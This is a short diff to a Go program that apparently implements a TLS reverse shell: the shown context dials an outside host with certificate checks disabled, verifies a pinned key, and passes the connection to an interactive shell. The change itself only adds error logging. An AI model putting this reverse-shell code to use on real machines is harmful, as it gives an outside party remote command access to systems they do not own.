@@ -101,7 +101,8 @@ func Reverse(connectString string, fingerprint []byte) {
 	)
 	config := &tls.Config{InsecureSkipVerify: true}
 	if conn, err = tls.Dial("tcp", connectString, config); err != nil {
-		log.Println("ERR: Host unreachable", connectString)
+		log.Println("ERR: Host unreachable")
+		log.Println(err)
 		os.Exit(ERR_HOST_UNREACHABLE)
 	}
 
@@ -109,6 +110,7 @@ func Reverse(connectString string, fingerprint []byte) {
 
 	if ok, err := CheckKeyPin(conn, fingerprint); err != nil || !ok {
 		log.Println("ERR: Bad fingerprint")
+		log.Println(err)
 		os.Exit(ERR_BAD_FINGERPRINT)
 	}
 	InteractiveShell(conn)
@@ -120,6 +122,7 @@ func main() {
 		bytesFingerprint, err := hex.DecodeString(fprint)
 		if err != nil {
 			log.Println("Could not decode fingerprint.")
+			log.Println(err)
 			os.Exit(ERR_COULD_NOT_DECODE)
 		}
 		Reverse(connectString, bytesFingerprint)
